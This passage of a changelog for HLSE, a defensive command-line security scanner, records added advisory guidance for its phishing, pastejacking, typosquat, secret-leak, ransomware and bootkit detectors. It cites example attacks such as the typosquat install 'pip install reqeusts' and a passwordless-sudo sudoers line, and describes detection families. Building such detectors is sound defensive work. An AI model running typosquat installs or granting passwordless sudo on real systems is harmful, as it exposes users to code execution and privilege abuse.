  the least actionable guidance?" Added five advisory lens fields
  (pattern, objective, verify, triage, cascade_risk) to both human
  output and JSON for every `esp` BLOCK/ISOLATE. The triage uniquely
  notes 'do NOT reinstall the OS — it won't remove a bootkit' — the
  most common harmful mistake after a bootkit detection. OK paths
  unchanged (blind spot only). All 14 HLSE subcommand BLOCK paths
  (url, text, email, clipboard, paste, network, secret, package, file,
  audit, protect, esp, scan [per-file]) now have advisory lenses.
  443 tests, all pass.

## [1.0.53] — 2026-06-20

### Added
- **Perspective 53: Per-finding remediation hints for `audit` HIGH/CRIT
  findings — `⚒ Fix:` line shows the exact command to resolve each
  failing hardening check.**
  Socratic question: "The `audit` subcommand identifies specific
  hardening failures with file path and line number (`A7: NOPASSWD in
  /etc/sudoers:58 — passwordless sudo: claude ALL=(ALL) NOPASSWD: ALL`).
  The check KNOWS the file, the line, and the specific misconfiguration.
  Yet the output stops at identification — a user who sees this must still
  web-search to know they need `sudo visudo` and to change `NOPASSWD:ALL`
  to `ALL`. Every other threat check in HLSE now has actionable guidance
  (verify/triage/cascade for BLOCK verdicts), but the audit — which is
  explicitly designed as a security posture report — provides no HOW,
  only the WHAT. Why does HLSE tell you SSH has PermitRootLogin=yes but
  not how to change it?" Added `audit_remediation_for()` static helper
  covering all 8 audit check codes (A1–A8) with specific commands:
  SSH config changes, `chmod 600` for credential files, `crontab -e`,
  `sudo visudo`, `systemctl --user disable`. Human output: `⚒ Fix:` line
  after each HIGH (severity ≥ 4) finding. JSON: `"fix"` field in each
  HIGH/CRIT finding object. PASS/INFO/LOW/MED findings unchanged.
  5 new integration tests added (443 total, all pass).

## [1.0.52] — 2026-06-20

### Added
- **Perspective 52: Advisory lenses for `protect` and `network` BLOCK
  verdicts — the two most time-critical subcommands now surface
  pattern / objective / verify / triage / cascade on threat alerts.**
  Socratic question: "After P46–P51, every BLOCK verdict in HLSE now
  has advisory lenses except two: `protect` (ransomware detection) and
  `network` (suspicious process/connection). These are arguably the
  most time-critical checks in the tool. A ransomware BLOCK has a
  15-minute critical window — the spread can be stopped if the machine
  is isolated immediately, and free decryptors may exist if law
  enforcement is contacted before the attacker's infrastructure goes
  offline. A network BLOCK may indicate an active C2 beacon — volatile
  memory contains the most forensic evidence, but it's lost on reboot.
  Yet both subcommands showed only the raw signal reasons with no
  guidance about disconnecting, photographing the ransom note, running
  'lsof -i', or calling the bank's fraud line.
  Added five advisory lens fields (pattern, objective, verify, triage,
  cascade_risk) to both `protect` and `network` BLOCK/ISOLATE paths
  in both human output and JSON. OK paths unchanged (blind spot only).
  6 new integration tests added (438 total, all pass). Every BLOCK
  verdict across all 13 HLSE subcommands now has advisory lenses."

## [1.0.51] — 2026-06-20

### Added
- **Perspective 51: Advisory lenses for `file` BLOCK verdicts —
  pattern / code-execution objective / verify / triage / cascade
  surfaced on every malicious file alert.**
  Socratic question: "The `file` subcommand detects disguised executables
  (double extension, RLO Unicode trick, Office macro lures, PDF/JS) —
  when BLOCK fires, it shows the F-code reason ('F1: DOUBLE EXTENSION —
  .pdf.exe disguised as .pdf') and nothing else. The other five BLOCK
  checks (paste, clipboard, email, package, secret) all received advisory
  lenses in P46–P50 and now tell the user the attack class, what the
  attacker wants, what to do before opening, and what to do if they
  already clicked. The file check, which defends against the same
  malware-delivery phase, still shows only the detection signal. A user
  who has already opened invoice.pdf.exe gets no guidance about
  disconnecting, no cascade-risk framing for the credentials that were
  active in their session, and no pointer to VirusTotal. Why?" Pattern
  label derived from the first reason code (double extension, RLO,
  macro, PDF/JS, or generic masquerade). Both human output (▸ Pattern,
  ◉ Attacker's goal, ✓ Verify first, ⚑ If you acted, ⊕ Also change)
  and JSON (pattern, objective, verify, triage, cascade_risk) now
  populated for every file BLOCK/ISOLATE. OK paths unchanged (blind
  spot only). 8 new integration tests added (432 total, all pass).

## [1.0.50] — 2026-06-20

### Added
- **Perspective 50: Advisory lenses for `secret` BLOCK verdicts —
  credential-type pattern / access-class objective / verify-first /
  triage / cascade surfaced on every credential exposure alert.**
  Socratic question: "The `secret` subcommand detects exposed credentials
  (AWS keys, GitHub tokens, Stripe keys, etc.) and when BLOCK fires,
  shows the credential type in brackets ([AWS Access Key ID]) and a
  generic remediation. But it doesn't name the attack pattern ('exposed
  credential — AWS Access Key ID'), doesn't say what the key grants
  ('S3 read/write, EC2 control, IAM privilege escalation'), doesn't
  suggest checking CloudTrail BEFORE revoking (so you know the blast
  radius), and doesn't say to treat every other credential in the same
  file as equally compromised. The credential type is already known from
  the finding — every piece of advisory context could be derived from it.
  Why is a leaked AWS root key and a leaked test API token presented
  identically, with the same generic 'revoke and rotate' message?" Added
  `secret_objective_for()` static helper mapping 7 credential families
  to specific access-class descriptions (AWS, GitHub/GitLab, Stripe,
  Google/GCP, Slack, SSH/Private Key, Database). Both human output
  (▸ Pattern, ◉ Attacker's goal, ✓ Verify first, ⚑ Immediate action,
  ⊕ Also change) and JSON (pattern, objective, verify, triage,
  cascade_risk) are now populated for every secret BLOCK/ISOLATE.
  OK paths unchanged (blind spot only). 8 new integration tests added
  (424 total, all pass).

## [1.0.49] — 2026-06-20

### Added
- **Perspective 49: Advisory lenses for `package` BLOCK verdicts —
  supply-chain pattern / code-execution objective / verify / triage /
  cascade surfaced on every typosquat alert.**
  Socratic question: "The `package` subcommand detects dependency
  confusion and typosquat attacks — an attacker publishes `reqeusts`
  knowing that `pip install reqeusts` will run their post-install script
  with the victim's shell privileges. When BLOCK fires, the verdict shows
  the Damerau-Levenshtein match ('reqeusts is 1 edit from requests') and
  nothing else. Every package BLOCK is a supply-chain code-execution
  attack: there is no ambiguity about the attack class, no sub-types, no
  benign explanations. The paste BLOCK (P46) now tells the user to
  'disconnect from the network'; the clipboard BLOCK (P47) says 'contact
  your exchange'; the email BLOCK (P48) says 'call your bank's fraud
  line'. Why does the package BLOCK — the only input vector in HLSE that
  directly causes arbitrary code execution under the user's own privileges
  — output nothing about what to do next?" Added five advisory lens fields
  (pattern, objective, verify, triage, cascade_risk) to both human output
  and JSON for every package BLOCK/ISOLATE. OK paths unchanged (blind
  spot only). 8 new integration tests added (416 total, all pass).

## [1.0.48] — 2026-06-20

### Added
- **Perspective 48: Full advisory lenses for `email` BLOCK verdicts —
  verify / triage / cascade surfaced for both body-pattern and
  header-only BLOCK paths.**
  Socratic question: "When the email handler reaches BLOCK/ISOLATE and
  the body text identifies BEC/urgency, it already names the body pattern
  and attacker's goal. But it stops there: `hlse_text_verify`,
  `hlse_text_triage`, and `hlse_text_cascade` are already wired for these
  exact patterns, yet the email path never calls them. The BEC objective
  says '72-hour SWIFT recall window'; `hlse_text_triage` for BEC says
  'call your bank's fraud line within 72 hours to attempt a SWIFT recall'.
  This is precisely the 60-second action a victim needs. Why does the
  email BLOCK that most accurately identifies BEC include the attacker's
  goal but omit the recovery action?
  Also: when only header signals fire at BLOCK level (SPF/DKIM/Reply-To
  mismatch, no body text), there are no advisory lenses at all, even
  though the attack class is identical — BEC spoofing infrastructure."
  Two fixes: (1) for body-pattern BLOCK, verify/triage/cascade now
  emit using the email header score (not the body text score, which may
  be below the 60-threshold even when headers are ISOLATE-level); (2) for
  header-only BLOCK, a synthetic TextVerdict with `"BEC: email header
  authentication failure"` reason threads through the existing advisory
  machinery. Both human and JSON output updated. 7 new integration tests
  added (408 total, all pass).

## [1.0.47] — 2026-06-20

### Added
- **Perspective 47: Advisory lenses for `clipboard` ISOLATE verdicts —
  pattern / attacker objective / verify / triage / cascade surfaced on
  every clipper-malware alert.**
  Socratic question: "The `clipboard` subcommand exists specifically to
  catch clipper malware — software that silently replaces a crypto address
  in the clipboard so the victim sends funds to the attacker instead of
  the intended recipient. When it fires, it shows the raw swap signal and
  a hardcoded remediation string. But it doesn't name the attack pattern,
  doesn't name the attacker's objective (irreversible wallet drain), gives
  no 'Verify first' step, no 'If you acted' triage for the user who may
  have already sent, and no cascade-risk framing for all the other
  addresses they may have copied since the malware was active. The `paste`
  BLOCK path now has all five advisory lenses; the `clipboard` ISOLATE
  path — which guards the most catastrophically irreversible loss in the
  entire tool — still has none. Why?" Added five advisory lens fields
  (pattern, objective, verify, triage, cascade_risk) to both human output
  and JSON for every clipboard BLOCK/ISOLATE. OK path unchanged (blind
  spot only). 8 new integration tests added (401 total, all pass).

## [1.0.46] — 2026-06-20

### Added
- **Perspective 46: Advisory lenses for `paste` BLOCK verdicts — ClickFix
  pattern / attacker objective / verify / triage / cascade surfaced on
  every pastejacking alert.**
  Socratic question: "Every `paste` BLOCK is a ClickFix / pastejacking
  attack — that's the only threat category the paste detector fires on.
  Yet a BLOCK verdict today shows only the raw signal reasons (P2, P4,
  Compound) with no pattern label, no attacker-objective framing, no
  triage steps, and no cascade-risk guidance. The `url` BLOCK path links
  every verdict to its attacker objective and first-response triage;
  the `text` BLOCK path does the same. Why does `paste`, the most
  immediately dangerous input vector (the command executes in the next
  keystroke), omit the advisory context that would help the user
  understand what was at stake and what to do next?" Synthetic
  `TextVerdict` with a `"Shell-pipe: paste-and-run pastejacking"` reason
  threads through the existing `hlse_classify_text_attack()` /
  `hlse_text_objective()` / `hlse_text_verify()` / `hlse_text_triage()` /
  `hlse_text_cascade()` machinery — no string duplication, no new lookup
  tables. Both human output (`▸ Pattern:`, `◉ Attacker's goal:`,
  `✓ Verify first:`, `⚑ If you acted:`, `⊕ Also change:`) and JSON
  (`"pattern"`, `"objective"`, `"verify"`, `"triage"`, `"cascade_risk"`)
  are populated for every paste BLOCK/ISOLATE. OK paths are unchanged
  (blind spot only). 8 new integration tests added (393 total, all pass).

## [1.0.45] — 2026-06-20

### Fixed
- **Perspective 45: Blind-spot disclosure for `protect`, `esp`, and `scan`
  OK paths — completing full coverage across every HLSE subcommand.**
  Socratic question: "The three most infrastructure-critical checks in the tool —
  ransomware/SMB/MBR detection (`protect`), EFI bootkit string scan (`esp`), and
  recursive secret detection (`scan`) — all return a bare `OK` with nothing about
  what they didn't check. `protect` only detects ransom note filenames, SMB
  share-encryption patterns, and known MBR overwrite signatures: memory-only
  ransomware, staged pre-encryption attacks, and fileless malware that writes no
  ransom note all pass clean. `esp` only matches known bootkit strings in the EFI
  System Partition: firmware-level implants and fileless Secure-Boot bypass
  techniques are invisible. `scan` only pattern-matches credential formats: secrets
  in binary artefacts, environment variables, and vault-managed keys fetched at
  runtime are missed. Why do the checks that guard the most irreversible damage
  offer no caveat about what they cannot see?" Added three new
  `hlse_blindspot_for()` cases (`protect`, `esp`, `scan`) and wired them into
  both human display and JSON for each OK path. With this change, every HLSE
  subcommand — `url`, `text`, `email`, `clipboard`, `paste`, `network`, `secret`,
  `package`, `file`, `audit`, `protect`, `esp`, `scan` — now discloses its blind
  spot on a clean verdict, in both the terminal and JSON output. Advisory-only: no
  score or detection change, F1 = 1.000 holds. 5 new CLI integration tests (385
  total). Zero warnings (CLI + library).

## [1.0.44] — 2026-06-20

### Fixed
- **Perspective 44: Blind-spot disclosure for `package`, `file`, and `audit`
  OK paths.**
  Socratic question: "The `package` OK just says `OK numpy`. But HLSE only
  checked whether the name resembles a known typosquat — it never looked at the
  package code, post-install scripts, or version history. The SolarWinds, XZ
  Utils, and log4shell incidents all involved correctly-named, widely-used
  packages. Why does a correctly-named package get a clean bill of health with no
  caveat about what was not checked?" Added three new `hlse_blindspot_for()`
  cases and wired them into both human display and JSON for each OK path: (1)
  `package`: "typosquat detection only — a compromised legitimate package, a
  dependency confusion attack, or malicious post-install scripts inside a
  correctly-named package are not detected; review the package's repository,
  recent commits, and published checksums before installing in a production or
  privileged environment." (2) `file`: "magic-byte and filename analysis only —
  obfuscated payloads, encrypted content, or malicious macros inside office
  formats are not detected; run untrusted files through a multi-engine scanner
  before opening." (3) `audit`: "point-in-time configuration snapshot — kernel-
  level exploits, container escapes, LD_PRELOAD injection, and custom LSM
  bypasses are outside the scope of this check; re-run after any system or
  configuration change." The `blind_spot` field appears in JSON only on score 0;
  threat-band JSON omits it. Advisory-only: no score or detection change, F1 =
  1.000 holds. 6 new CLI integration tests (380 total). Zero warnings (CLI +
  library).

## [1.0.43] — 2026-06-20

### Fixed
- **Perspective 43: Correct blind spot for canonical URLs; add blind spots
  for `secret` and `network`.**
  Three related issues, all in the same "what an OK cannot see" category:
  (1) *Canonical URL blind-spot contradiction.* When `hlse_canonical_confirm()`
  authenticates a domain (e.g. paypal.com) and the user sees `✔ Canonical:
  confirmed authentic paypal domain`, the immediately-following blind-spot line
  said "a pixel-perfect clone on a clean or newly-compromised domain still
  phishes; confirm the brand independently before entering credentials." These two
  lines directly contradict each other: the canonical confirmation already
  confirmed the brand, and then the blind spot told the user to confirm the brand.
  Fixed by adding a `"url_canonical"` case to `hlse_blindspot_for()` and
  selecting it when `has_canon` is true: "positive authentication covers the
  domain name — it cannot verify the page's content, a same-site redirect, or
  that the service actually sent you here; close unexpected pop-ups and confirm
  the specific page's request is what you expect from this service before
  entering credentials or authorising payment." The original "pixel-perfect clone"
  blind spot is retained for unconfirmed clean URLs. Both human and JSON outputs
  are corrected.
  (2) *`secret` OK has no blind spot.* Pattern-based detection misses novel
  credential formats, encoded secrets, and credentials split across lines.
  (3) *`network` OK has no blind spot.* Local-view-only — DNS-over-HTTPS,
  process-level routing, encrypted tunnels, and outbound traffic over allowed
  ports are invisible to this check.
  All three new blind-spot cases are exposed in both human display and JSON.
  Advisory-only: no score or detection change, F1 = 1.000 holds. 8 new CLI
  integration tests (374 total). Zero warnings (CLI + library).

## [1.0.42] — 2026-06-20

### Fixed
- **Perspective 42: Blind-spot caveat reaches JSON consumers, not just the
  terminal.**
  Socratic question: "P41 gave human readers a blind-spot caveat on a clean
  verdict — but the JSON output, which is what a SIEM, a CI gate, or an automated
  mailbox filter actually parses, still emitted only `{action: SAFE}` with no
  hedge. The machine consumer faces exactly the false-confidence trap we just
  closed for humans: it logs 'SAFE' and moves on, never recording that this was a
  structural check that cannot see a pixel-perfect clone or an unverified payment
  address. The JSON already carries every *threat-band* hedge (exoneration,
  verify, triage, cascade_risk); why does the score-0 hedge stop at the
  terminal?" Added a `"blind_spot"` field to every clean (score 0) JSON verdict
  across all five kinds that have a human blind spot: `url` and `text` (via
  `print_json_url`/`print_json_text`, covering the default, `text` subcommand and
  `--stdin` paths), plus the dedicated `clipboard`, `paste`, and `email`
  subcommand JSON. The field appears only on a clean verdict — threat-band JSON
  omits it, exactly as the human path suppresses the line on a detected threat.
  Advisory-only: no score or detection change, all OK JSON remains valid and
  parseable, F1 = 1.000 holds. 6 new CLI integration tests (366 total). Zero
  warnings (CLI + library).

## [1.0.41] — 2026-06-20

### Fixed
- **Perspective 41: Blind-spot disclosure on the irreversible-harm checks
  (`clipboard`, `paste`).**
  Socratic question: "The `url`, `text`, and `email` clean paths each append an
  `ℹ Blind spot:` line — what an `OK` cannot see, so the user does not mistake it
  for proof of safety. But `clipboard` (crypto address-swap → theft) and `paste`
  (pastejacking → arbitrary code execution) — the two MOST dangerous, *irreversible*
  checks in the tool — return a bare `OK` with no caveat. A `clipboard` OK only
  proves the two addresses you provided match each other; it never verified the
  address belongs to the intended recipient. A user about to wire their life
  savings reads `OK (clipboard)` and sends to an address HLSE never authenticated.
  Why do the highest-stakes verdicts alone offer no hedge against false
  confidence?" Added `clipboard` and `paste` cases to `hlse_blindspot_for()` and
  wired them into both OK paths. The clipboard caveat names the irreversibility
  and the real verification (check the full address against the recipient's own
  published source); the paste caveat states the check flags injection patterns,
  not whether a command is safe to run. The blind-spot line appears only on a
  clean verdict — a detected swap or hostile paste suppresses it (the threat
  guidance speaks instead). Advisory-only: no score or detection change, F1 =
  1.000 holds. 4 new CLI integration tests (360 total). Zero warnings (CLI +
  library).

## [1.0.40] — 2026-06-20

### Fixed
- **Perspective 40: Library build is warning-free, like the CLI build.**
  Socratic question: "The project invariant is 'zero compiler warnings', and
  `make check-warnings` proves it — but that gate compiles the *CLI*. The README
  tells library users to build `libhlse.so` with `-DHLSE_CORE_AS_LIB`. That build
  excludes the CLI `main`, so the two blast-radius helpers `asset_class_of` and
  `asset_mask_describe` — defined before the `#ifndef HLSE_CORE_AS_LIB` guard but
  used only inside it — become unused functions and emit `-Wunused-function`
  warnings. A consumer following our own integration instructions sees warnings
  we claim don't exist. Does 'zero warnings' mean zero for *us*, or zero for the
  people we asked to link the library?" Three fixes:
  (1) The two CLI-only helpers `asset_class_of`/`asset_mask_describe` are now
  marked `__attribute__((unused))` — the exact idiom the file already uses for
  `action_for_score`, which faces the same CLI-only-in-a-dual-build situation —
  silencing `-Wunused-function` in the library build.
  (2) `make check-warnings` now ALSO compiles every module with
  `-DHLSE_CORE_AS_LIB` under the full strict flag set, so the library build is
  gated permanently and this class of regression cannot silently return. The
  prior gate only checked the CLI translation unit, where these functions appear
  used.
  (3) The new gate immediately surfaced a latent `-Wformat-truncation=2` warning
  in the public API `hlse_confusable_report`: in library mode GCC cannot see
  callers to bound `outsz`, so the direct `snprintf` of the diagnostic literal
  tripped the aggressive truncation check. Reworked to stage into a fixed-size
  local buffer then copy with an explicit `memcpy` clamp to `outsz` — provably
  bounded and outside the format-truncation analysis. Output is byte-identical
  ("position N is &lt;script&gt; U+XXXX, not an ASCII letter").
  Pure build hygiene: no code path, score, or output changes, so F1 = 1.000
  holds. All 356 CLI integration tests pass, ASan/UBSan clean.

## [1.0.39] — 2026-06-20

### Fixed
- **Perspective 39: Channel-only risk is displayed, not silently reported OK.**
  Socratic question: "P37 made `--from sms` boost a benign message's *effective*
  score to 15 (LOG), and the exit code already gates on that boosted score — a
  channel-only LOG exits 1 when the fail threshold is crossed. The JSON output
  honestly reports `effective_score: 15, effective_action: LOG`. But the human
  display still prints a bare `OK` whenever the *content* score is 0, even though
  the channel prior lifted it above zero. So three observers of the very same
  invocation disagree: the JSON says LOG, the exit code says threat, and the
  terminal says OK. The display is the one a human actually reads — why is it the
  only one telling them everything is fine?" Fixed in all three human-readable
  paths (the `text` subcommand, the default auto-detect path, and `--stdin` pipe
  mode): when the content scores 0 but `--from` contributes a positive delta, the
  display now shows the channel-elevated score (`LOG [15] …`), the `· Channel
  (…)` reason line, and the blind-spot caveat — instead of a misleading `OK`. The
  `manual` channel (delta 0) and the no-`--from` case correctly remain plain `OK`.
  This is pure advisory/display reconciliation: scores, gates, and JSON are
  unchanged, so F1 = 1.000 holds. 7 new CLI integration tests (356 total). Zero
  warnings.

## [1.0.38] — 2026-06-20

### Fixed
- **Perspective 38: Email body social-engineering lens (`email` subcommand).**
  Socratic question: "The `email` subcommand runs header forensics — SPF/DKIM
  alignment, Reply-To vs From mismatch, missing Received chains. But a BEC attack's
  decisive evidence is in the message BODY: 'wire $50000 immediately, keep
  confidential, do not call.' The `text` subcommand detects exactly this and names
  it 'BEC wire-transfer fraud' with the attacker's objective. Yet `email` mode is
  completely blind to the body — an attacker who sends a clean-header email (their
  own legitimately-configured domain) from a compromised-but-authentic account
  passes every header check and HLSE reports nothing actionable, even though the
  body is textbook BEC. Why does the email path forgo the social-engineering
  analysis that the text path already performs?" The email path now runs
  `hlse_check_text()` on the same input and surfaces the attack pattern as an
  ADVISORY lens: `▸ Body pattern: <pattern> (body score N)` plus `◉ Attacker's
  goal`. Crucially, the email forensics SCORE is unchanged — this is pure advisory
  augmentation, so F1 = 1.000 is preserved. When headers are clean (score 0) but
  the body is flagged, the output reads `OK [0] (email forensics) — headers clean,
  but body flagged below`, closing the gap where clean headers masked a malicious
  body. JSON gains `body_pattern` and `body_score` fields. 6 new CLI integration
  tests (349 total). Also corrected the `--from` help text ("boosts URL & text
  score" — it applies to both since P37). Zero warnings.

## [1.0.37] — 2026-06-20

### Fixed
- **Perspective 37: Channel prior applies to text verdicts (`--from` flag).**
  Socratic question: "The `--from` channel flag boosts a URL's score to account
  for its delivery channel — a URL in a QR code (+20) is more suspicious than
  one typed manually (+0). Text messages also arrive via channels: an unsolicited
  SMS ('Your account has been suspended') has the same smishing amplification as
  an SMS-delivered URL. But all three display sites gated the channel boost on
  `if (sr.is_url && g_from_channel)`, silently discarding the channel context
  for text verdicts. `--from sms text '...'` applied zero delta, as if the SMS
  delivery channel is irrelevant to text social engineering." Fixed by removing
  the `sr.is_url &&` condition from all channel delta applications (display score,
  channel reason line, exit code gate) and adding a channel delta computation to
  the `text` subcommand's display path (which had none). `print_json_text()` also
  gains the `channel`, `channel_delta`, `effective_score`, and `effective_action`
  JSON fields in symmetric parity with `print_json_url()`. A BEC text message
  that raw-scores LOG/ALERT [58] now reaches BLOCK [68] when delivered via email
  (--from email) and exits 1 at the default threshold. 4 new CLI integration
  tests (old "ignored" test replaced); 343 total. Zero warnings. F1=1.000 kept.

### Fixed
- **Perspective 36: Amplifier lines filtered from human-readable `·` reason list.**
  Socratic question: "URL verdict reasons shown with `·` are raw detected facts:
  'Brand homoglyph: paypa1.com → paypal.com'. Text verdict reasons mix two types:
  base signal hits ('Urgency pressure', 'Financial/credential req') and derived
  amplifier notes ('Amplifier: wire transfer + urgency = BEC pattern'). Amplifiers
  are synthesis — exactly what the `▸ Pattern:` line already provides, but in
  internal system terminology. A user sees both 'Amplifier: secrecy pressure +
  financial request = victim isolation tactic' AND '▸ Pattern: BEC wire-transfer
  fraud' — redundant, and the amplifier uses jargon not meaningful to end users."
  Filtered `Amplifier:` prefix lines from all three `·` reason printing loops
  (stdin, `text` subcommand, default auto-detect). Amplifiers are retained in the
  JSON `reasons` array for integrators who need the full signal chain. 4 new CLI
  integration tests (340 total before P37). Zero warnings. F1=1.000 preserved.

## [1.0.35] — 2026-06-20

### Changed
- **Perspective 35: Centralise text advisory output (`print_text_advisories`).**
  Socratic question: "The URL path routes every advisory line through one
  `print_url_advisories()` helper, with a comment explaining the point — so the
  three URL output sites (stdin / `text` subcommand / default auto-detect)
  *cannot* drift out of sync. The text path does the opposite: the same ~25-line
  advisory block (▸ Pattern, ◉ Attacker's goal, ✓ Verify first, ⚖ Confidence,
  ⚑ If you acted, ⊕ Also change) is copy-pasted into all three text sites. Each
  Perspective from P27 onward had to be applied three times, by hand, in lockstep
  — one missed edit and the three paths silently diverge. Why does the URL path
  get a drift-proof single source of truth while the text path, which has had far
  more advisory lenses added, is left as triplicated copy-paste?" Extracted a new
  `print_text_advisories(const TextVerdict *)` mirroring `print_url_advisories()`
  exactly: it emits the six conditional lens lines and, like its URL sibling,
  leaves the "↺ Could be benign" exoneration and the "· <channel>" line to each
  caller (those depend on caller-local channel state). All three text sites now
  call the single helper. Output is byte-identical (verified: all 333 prior tests
  pass unchanged, plus a new cross-path parity test asserting the subcommand,
  `--stdin`, and default paths emit the same advisory block for the same input).
  Net −33 lines in `hlse_core.c`. 3 new CLI integration tests (336 total). Zero
  warnings. F1 = 1.000 preserved — pure structural refactor, no behaviour change.

## [1.0.34] — 2026-06-17

### Fixed
- **Perspective 34: Unmapped text signal family coverage.**
  Socratic question: "The text detector table has 14 signal families. Three of
  them — `Fake security alert`, `Direct financial action`, and
  `Shell-pipe-to-interpreter` — fire and contribute to the score, but were not
  mapped in `hlse_classify_text_attack()` or `hlse_text_confidence()`. A message
  containing only `Shell-pipe-to-interpreter` showed no `▸ Pattern:` and no
  `⚖ Confidence:` line, and fell back to the generic 'urgent or financial
  wording' exoneration (wrong — the signal has nothing to do with urgency). A
  `Fake security alert + Urgency` ALERT showed `single signal` confidence even
  though two independent families fired. Shouldn't every signal family that
  contributes to the score also participate in classification and confidence?"
  Three-part fix:
  1. `Fake security alert` now sets `bait = 1` in classify (fake account-
     suspension hooks ARE credential-harvest baits) and increments `n_sigs` in
     confidence as an independent family. When `fake_alert` fires alone, the
     pattern is "fake security alert / account suspension phishing" with a
     service-provider-specific exoneration. When combined with `urgency`, the
     pattern is promoted to "urgency credential-harvest phishing" (more accurate
     than "urgency social engineering") and confidence correctly reflects both
     signals.
  2. `Direct financial action` similarly sets `bait = 1` and counts as an
     independent signal in confidence. BEC inputs with explicit "send money"
     language on top of "wire transfer" now show "high confidence — 3
     independent signal categories" instead of "2".
  3. `Shell-pipe-to-interpreter` maps to the `clickfix` classification path
     (both are command-injection lures). Shell-pipe messages now show
     `▸ Pattern: ClickFix script-injection lure (paste-and-run attack)`,
     `⚖ Confidence: single signal`, and a decisive-test exoneration about
     official package managers — replacing the previous silent drop-through to
     a generic wrong exoneration.
  `hlse_text_exoneration()` also gains a `ClickFix / script-injection` branch
  covering the LOG/ALERT band for shell-pipe and ClickFix inputs, and a `fake
  security alert / account suspension` branch for standalone fake-alert inputs.
  7 new CLI integration tests (333 total). Zero warnings. F1 = 1.000 preserved.

## [1.0.33] — 2026-06-17

### Fixed
- **Perspective 33: Subdomain canonical confirmation (`hlse_canonical_confirm`).**
  Socratic question: "`hlse_canonical_confirm()` confirms exact canonical domains
  plus `www.` prefix — so `paypal.com` and `www.paypal.com` are confirmed. But
  `login.paypal.com`, `accounts.google.com`, and `id.apple.com` are official
  brand domains used in legitimate authentication flows. Without confirmation,
  users scanning these URLs see no `✔ Canonical:` line — indistinguishable from
  an unknown domain. Shouldn't HLSE confirm official subdomains of known brands,
  so a user scanning `login.paypal.com` knows it's genuinely PayPal's
  authentication domain?" Extended `hlse_canonical_confirm()` to also confirm
  official subdomains: after stripping `www.`, checks both exact match AND
  whether the host ends with `.<canonical_domain>`. The subdomain check is safe
  because this path is only reached when `score == 0` — any spoofed domain that
  triggered a brand detector has a non-zero score and never reaches this check.
  `login.paypal.com`, `accounts.google.com`, `id.apple.com`, and any other
  official brand subdomain now show `✔ Canonical: confirmed authentic <brand>
  domain (HLSE brand registry)` and the `canonical_brand` JSON field. 5 new CLI
  integration tests (326 total). Zero warnings. F1 = 1.000 preserved.

## [1.0.32] — 2026-06-17

### Added
- **Perspective 32: Text cascade risk (`hlse_text_cascade`).**
  Socratic question: "URL verdicts have ⊕ Also change: naming every account
  class in the password-reuse blast radius (email, banking, every service
  sharing the harvested password). Text BLOCK verdicts identify the primary
  attack and give triage — but say nothing about the downstream accounts that
  fall if the primary is compromised. A ClickFix victim who disconnects their
  machine has stopped the attack but may still have all saved browser passwords
  exfiltrated. A BEC victim who recalls the wire has stopped the funds but the
  corporate email account may be compromised, giving the attacker the recovery
  address for everything else. Shouldn't text BLOCK verdicts also name what
  else is at risk, parallel to the URL ⊕ Also change: line?" New
  `hlse_text_cascade(const TextVerdict *v)` (public API) maps each text attack
  pattern to a cascade description: ClickFix → all browser/OS stored credentials
  (assume script exfiltrated them); BEC/CEO-fraud → corporate email (recovery
  address for every downstream service); tech-support → all credentials visible
  during remote-access session; urgency credential-harvest → email + every
  account sharing the password; QR phishing → account entered + email + shared
  passwords; investment scam → other liquid assets and exchange/bank accounts.
  Returns NULL when score < 60 or no recognisable pattern. Displayed as
  ⊕ Also change: after ⚑ If you acted: in all three text display paths. Added
  as "cascade_risk" JSON field (score ≥ 60 only). 5 new tests (321 total).
  Zero warnings. F1 = 1.000 preserved. Text BLOCK advisory now has full
  symmetry with URL BLOCK: Pattern → Objective → Verify first → Confidence →
  Triage → Cascade risk.

## [1.0.31] — 2026-06-17

### Added
- **Perspective 31: Text pre-action verify step (`hlse_text_verify`).**
  Socratic question: "URL BLOCK verdicts show BOTH ✓ Verify independently:
  (what to check before clicking) AND ⚑ If already clicked: (post-click
  triage). Text BLOCK verdicts show only ⚑ If you acted: whose label implies
  post-action, even when the most important advice is pre-action — 'DO NOT
  send the wire transfer'. A BEC victim reading BLOCK [100] needs to know the
  single decisive check to do BEFORE authorising anything: call the supposed
  sender on a separately-known number. A ClickFix victim needs: never paste
  commands from unsolicited messages. Burying pre-action guidance inside a
  post-action label obscures it. Should text BLOCK verdicts have the same
  ✓ Verify first: / ⚑ If you acted: split that URL verdicts already have?"
  New `hlse_text_verify(const TextVerdict *v)` (public API) mirrors
  `hlse_verification_for()` for text: BEC → call the supposed sender on a
  separately-known number; ClickFix → never paste commands from unsolicited
  messages; tech-support → call the main switchboard independently; investment
  → verify FCA/SEC registration; grandparent/emergency → call the family member
  directly; callback/vishing → don't call the provided number; lottery/advance-
  fee → don't pay any upfront fee; QR phishing → preview QR destination first;
  urgency credential-harvest → navigate directly via bookmark/search engine.
  Returns NULL when score < 60 or no recognisable pattern. Displayed as
  ✓ Verify first: positioned between ◉ Attacker's goal: and ⚖ Confidence: to
  mirror URL advisory layout. Added as "verify" JSON field (score ≥ 60 only).
  All three text display paths and print_json_text() updated. 6 new tests (316
  total). Zero warnings. F1 = 1.000 preserved.

## [1.0.30] — 2026-06-17

### Added
- **Perspective 30: Pattern-aware text exoneration (`hlse_text_exoneration`).**
  Socratic question: "`hlse_exoneration_for('text', score)` returns 'heuristic —
  urgent or financial wording appears in genuine messages too' for every LOG/ALERT
  text verdict — including QR-code phishing (nothing to do with urgent wording),
  callback scams (targeting phone numbers, not urgency language), and investment
  lures (looking like financial advice). The falsifying test ('were you expecting
  this, does it push you to act in a hurry?') is unanswerable for a QR code. Isn't
  the benign explanation and decisive test wrong for most patterns — exactly the
  same problem P24 fixed for URLs?" New `hlse_text_exoneration(const TextVerdict *v)`
  (public API) mirrors `hlse_url_exoneration()` for text: QR → "scan with a QR
  decoder that shows the URL before opening it"; callback/vishing → "find the number
  independently on the official website"; investment/pig-butchering → "verify
  FCA/SEC register"; lottery/advance-fee → "genuine prizes don't require upfront
  fees"; urgency credential-harvest → "navigate to the site directly and check your
  account dashboard"; authority impersonation → "verify by calling a number you
  already have"; BEC/CEO-fraud → "wire-transfer requests without a prior phone call
  are a strong warning sign". Falls back to `hlse_exoneration_for("text", score)`
  for unrecognised patterns. Score-gated to [15, 59] (same as `hlse_url_exoneration`).
  All three text display paths and `print_json_text()` updated to use
  `hlse_text_exoneration()` in place of the generic call. P26 test updated to check
  for "decisive test" (content-invariant) rather than the replaced generic text.
  6 new P30 CLI integration tests (310 total). Zero warnings. F1 = 1.000 preserved.

